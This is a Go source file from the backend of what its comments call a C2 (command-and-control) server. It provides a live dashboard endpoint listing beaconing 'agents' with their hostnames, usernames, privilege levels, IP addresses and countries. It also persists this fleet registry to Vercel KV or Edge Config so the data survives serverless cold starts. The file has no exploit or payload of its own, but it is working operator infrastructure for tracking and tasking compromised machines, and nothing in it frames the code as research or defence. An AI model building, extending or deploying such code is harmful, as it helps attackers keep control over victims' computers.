package api

import (
	"bytes"
	"encoding/json"
	"io"
	"log"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/gin-gonic/gin"

	"chemicalumbra.dev/server/pkg/agent"
	"chemicalumbra.dev/server/pkg/task"
)

// The dashboard used to poll /api/agents (and /api/stats, and each page's own
// list) on separate 10-15s timers, so different tiles disagreed about the same
// moment in time. /api/live returns one coherent snapshot — agents + stats +
// recent tasks, one timestamp — so every panel on screen is the same frame.

// maxConcurrentWS is the operator-facing socket count we still expose, kept for
// /api/live consumers that render the "live feed" pill.
var liveStarted = time.Now()

const (
	activeWindow = 120 * time.Second
	staleWindow  = 30 * time.Minute
)

var (
	agentMgrRef  *agent.Manager
	taskQueueRef *task.Queue

	liveMu       sync.Mutex
	lastLiveSave time.Time
)

// liveStoreKind reports where the snapshot is being durably kept, so the UI can
// say "not persisted" instead of rendering an empty table as though it were true.
func liveStoreKind() string {
	if kvURL() != "" && kvToken() != "" {
		return "kv"
	}
	if edgeConfigID() != "" && vercelAPIToken() != "" {
		return "edge"
	}
	return "memory"
}

func kvURL() string {
	for _, k := range []string{"KV_REST_API_URL", "UPSTASH_REDIS_REST_URL", "REDIS_REST_API_URL"} {
		if v := strings.TrimSpace(os.Getenv(k)); v != "" {
			return strings.TrimRight(v, "/")
		}
	}
	return ""
}

func kvToken() string {
	for _, k := range []string{"KV_REST_API_TOKEN", "UPSTASH_REDIS_REST_TOKEN", "REDIS_REST_API_TOKEN"} {
		if v := strings.TrimSpace(os.Getenv(k)); v != "" {
			return v
		}
	}
	return ""
}

type liveSnapshot struct {
	Agents  []*agent.Agent `json:"agents"`
	SavedAt time.Time      `json:"saved_at"`
}

// displayStatus recomputes liveness from LastSeen instead of trusting a stored
// flag. On a serverless host the stale-cleanup ticker never gets to run, so a
// machine that went away used to sit at "active" forever.
func displayStatus(a *agent.Agent) string {
	if a == nil {
		return "offline"
	}
	if a.Status == "dead" {
		return "dead"
	}
	if a.LastSeen.IsZero() {
		return "stale"
	}
	age := time.Since(a.LastSeen)
	switch {
	case age <= activeWindow:
		return "active"
	case age <= staleWindow:
		return "stale"
	default:
		return "offline"
	}
}

// saveLive writes the current agent registry to the durable store. Synchronous
// on purpose: on Vercel the function freezes the moment the response is written,
// so a background goroutine would be killed before it ever left the machine.
func saveLive() { saveLiveWithin(5 * time.Second) }

func saveLiveNow() { saveLiveWithin(1500 * time.Millisecond) }

func saveLiveWithin(minGap time.Duration) {
	kind := liveStoreKind()
	if kind == "memory" || agentMgrRef == nil {
		return
	}
	liveMu.Lock()
	if time.Since(lastLiveSave) < minGap {
		liveMu.Unlock()
		return
	}
	lastLiveSave = time.Now()
	liveMu.Unlock()

	snap := liveSnapshot{Agents: agentMgrRef.List(), SavedAt: time.Now()}
	body, err := json.Marshal(snap)
	if err != nil {
		return
	}
	switch kind {
	case "kv":
		kvSet("umbra_live_agents", string(body))
	case "edge":
		edgeWrite("umbra_live_agents", json.RawMessage(body))
	}
}

func kvSet(key, val string) {
	req, err := http.NewRequest(http.MethodPost, kvURL()+"/set/"+key, strings.NewReader(val))
	if err != nil {
		return
	}
	req.Header.Set("Authorization", "Bearer "+kvToken())
	req.Header.Set("Content-Type", "application/json")
	res, err := (&http.Client{Timeout: 6 * time.Second}).Do(req)
	if err != nil {
		log.Printf("[live] kv set: %v", err)
		return
	}
	defer res.Body.Close()
	if res.StatusCode >= 300 {
		b, _ := io.ReadAll(io.LimitReader(res.Body, 200))
		log.Printf("[live] kv set %d %s", res.StatusCode, b)
	}
}

func kvGet(key string) string {
	req, err := http.NewRequest(http.MethodGet, kvURL()+"/get/"+key, nil)
	if err != nil {
		return ""
	}
	req.Header.Set("Authorization", "Bearer "+kvToken())
	res, err := (&http.Client{Timeout: 6 * time.Second}).Do(req)
	if err != nil {
		return ""
	}
	defer res.Body.Close()
	if res.StatusCode >= 300 {
		return ""
	}
	var out struct {
		Result *string `json:"result"`
	}
	if json.NewDecoder(io.LimitReader(res.Body, 1<<20)).Decode(&out) != nil || out.Result == nil {
		return ""
	}
	return *out.Result
}

func edgeWrite(key string, value json.RawMessage) {
	body, _ := json.Marshal(map[string]any{
		"items": []map[string]any{{"operation": "upsert", "key": key, "value": value}},
	})
	url := "https://api.vercel.com/v1/edge-config/" + edgeConfigID() + "/items?teamId=" + vercelTeamID()
	req, err := http.NewRequest(http.MethodPatch, url, bytes.NewReader(body))
	if err != nil {
		return
	}
	req.Header.Set("Authorization", "Bearer "+vercelAPIToken())
	req.Header.Set("Content-Type", "application/json")
	res, err := (&http.Client{Timeout: 6 * time.Second}).Do(req)
	if err != nil {
		log.Printf("[live] edge write: %v", err)
		return
	}
	defer res.Body.Close()
	if res.StatusCode >= 300 {
		b, _ := io.ReadAll(io.LimitReader(res.Body, 200))
		log.Printf("[live] edge write %d %s", res.StatusCode, b)
	}
}

func loadLive() *liveSnapshot {
	var raw string
	switch liveStoreKind() {
	case "kv":
		raw = kvGet("umbra_live_agents")
	case "edge":
		res, err := (&http.Client{Timeout: 6 * time.Second}).Get(
			"https://edge-config.vercel.com/" + edgeConfigID() + "/item/umbra_live_agents?token=" + edgeReadToken())
		if err != nil || res.StatusCode >= 300 {
			if res != nil {
				res.Body.Close()
			}
			return nil
		}
		defer res.Body.Close()
		b, _ := io.ReadAll(io.LimitReader(res.Body, 1<<20))
		raw = string(b)
	default:
		return nil
	}
	if raw == "" {
		return nil
	}
	var snap liveSnapshot
	if json.Unmarshal([]byte(raw), &snap) != nil {
		return nil
	}
	return &snap
}

// hydrateLive restores the last known agents into the local DB. Without it a
// cold start shows an empty fleet even though the machines are still out there
// beaconing, which reads as "the C2 lost everything".
func hydrateLive() {
	snap := loadLive()
	if snap == nil || db == nil || len(snap.Agents) == 0 {
		return
	}
	n := 0
	for _, a := range snap.Agents {
		if a == nil || a.ID == "" || a.HwID == "" {
			continue
		}
		if a.Status == "dead" {
			// Removed operators stay removed across cold starts.
			_, _ = db.Exec(`DELETE FROM agents WHERE id = ?`, a.ID)
			continue
		}
		_, err := db.Exec(`
			INSERT INTO agents
			(id, session_id, hostname, username, os_version, arch, pid, privileges, hw_id, build_version,
			 first_seen, last_seen, ip_address, country, tags, notes, status, metadata)
			VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
			ON CONFLICT(id) DO UPDATE SET
				hostname=excluded.hostname,
				username=excluded.username,
				os_version=excluded.os_version,
				arch=excluded.arch,
				pid=excluded.pid,
				privileges=excluded.privileges,
				hw_id=excluded.hw_id,
				build_version=excluded.build_version,
				last_seen=excluded.last_seen,
				ip_address=excluded.ip_address,
				country=excluded.country,
				tags=excluded.tags,
				notes=excluded.notes,
				status=excluded.status,
				metadata=excluded.metadata`,
			a.ID, a.SessionID, a.Hostname, a.Username, a.OSVersion, a.Arch, a.PID, a.Privileges, a.HwID,
			a.BuildVersion, a.FirstSeen, a.LastSeen, a.IPAddress, a.Country, a.Tags, a.Notes, a.Status, a.Metadata)
		if err == nil {
			n++
		}
	}
	if n > 0 {
		log.Printf("[live] hydrated %d agents from %s store", n, liveStoreKind())
	}
}

func statsFor(agentMgr *agent.Manager, taskQueue *task.Queue) gin.H {
	active, stale, offline, elevated := 0, 0, 0, 0
	for _, a := range agentMgr.List() {
		switch displayStatus(a) {
		case "active":
			active++
		case "stale":
			stale++
		default:
			offline++
		}
		if a.Privileges > 0 {
			elevated++
		}
	}
	pending, completed, failed := 0, 0, 0
	if taskQueue != nil {
		if all, err := taskQueue.GetRecent(500); err == nil {
			for _, t := range all {
				switch t.Status {
				case "pending", "running", "queued":
					pending++
				case "completed":
					completed++
				case "failed":
					failed++
				}
			}
		}
	}
	return gin.H{
		"agents_total":    agentMgr.Count(),
		"agents_active":   active,
		"agents_stale":    stale,
		"agents_offline":  offline,
		"agents_elevated": elevated,
		"tasks_pending":   pending,
		"tasks_completed": completed,
		"tasks_failed":    failed,
		"uptime_seconds":  int(time.Since(startedAt).Seconds()),
		"started_at":      liveStarted,
	}
}

// liveHandler is the single poll target for the console. Everything on screen
// is served from one response with one server timestamp.
func liveHandler(agentMgr *agent.Manager) gin.HandlerFunc {
	return func(c *gin.Context) {
		agents := agentMgr.List()
		out := make([]gin.H, 0, len(agents))
		for _, a := range agents {
			out = append(out, gin.H{
				"id":            a.ID,
				"session_id":    a.SessionID,
				"hostname":      a.Hostname,
				"username":      a.Username,
				"os_version":    a.OSVersion,
				"arch":          a.Arch,
				"pid":           a.PID,
				"privileges":    a.Privileges,
				"hw_id":         a.HwID,
				"build_version": a.BuildVersion,
				"first_seen":    a.FirstSeen,
				"last_seen":     a.LastSeen,
				"ip_address":    a.IPAddress,
				"country":       a.Country,
				"status":        displayStatus(a),
				"capabilities":  a.Capabilities,
			})
		}
		var recent []*task.Task
		if taskQueueRef != nil {
			if t, err := taskQueueRef.GetRecent(50); err == nil {
				recent = t
			}
		}
		if recent == nil {
			recent = []*task.Task{}
		}
		c.Header("Cache-Control", "no-store")
		c.JSON(http.StatusOK, gin.H{
			"ts":        time.Now().UTC(),
			"durable":   liveStoreKind() != "memory",
			"store":     liveStoreKind(),
			"stats":     statsFor(agentMgr, taskQueueRef),
			"agents":    out,
			"tasks":     recent,
			"ws":        false, // operator socket does not survive a serverless freeze
			"poll_ms":   2500,
			"server_ok": true,
		})
	}
}
